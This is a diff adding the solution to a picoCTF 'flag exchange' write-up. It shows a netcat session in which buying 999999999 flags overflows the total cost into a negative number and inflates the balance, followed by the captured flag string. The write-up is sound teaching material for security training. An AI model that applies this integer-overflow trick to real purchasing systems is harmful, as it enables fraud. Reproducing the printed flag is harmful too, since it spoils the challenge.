@@ -133,4 +133,85 @@ We sell flags
 ```
 
 Going through the program it can be seen that there is a check for account balance **if (account_balance > 100000)**
-it will provide the flag.So we need to make the account balance greater than 100000.
+it will provide the flag.So we need to make the account balance greater than 100000. Looks like using a overflow bug the account balance can be changed to a large number.
+
+### Trying out the solution
+
+```
+>> nc jupiter.challenges.picoctf.org 9745
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+1
+
+
+
+ Balance: 1100
+
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+1
+These knockoff Flags cost 900 each, enter desired quantity
+999999999
+
+The final cost is: -1943133060
+
+Your current balance after transaction: 1943134160
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+2
+1337 flags cost 100000 dollars, and we only have 1 in stock
+Enter 1 to buy one1
+YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+
+```
+
+### The flag
+
+```
+picoCTF{m0n3y_bag5_65d67a74}
+```
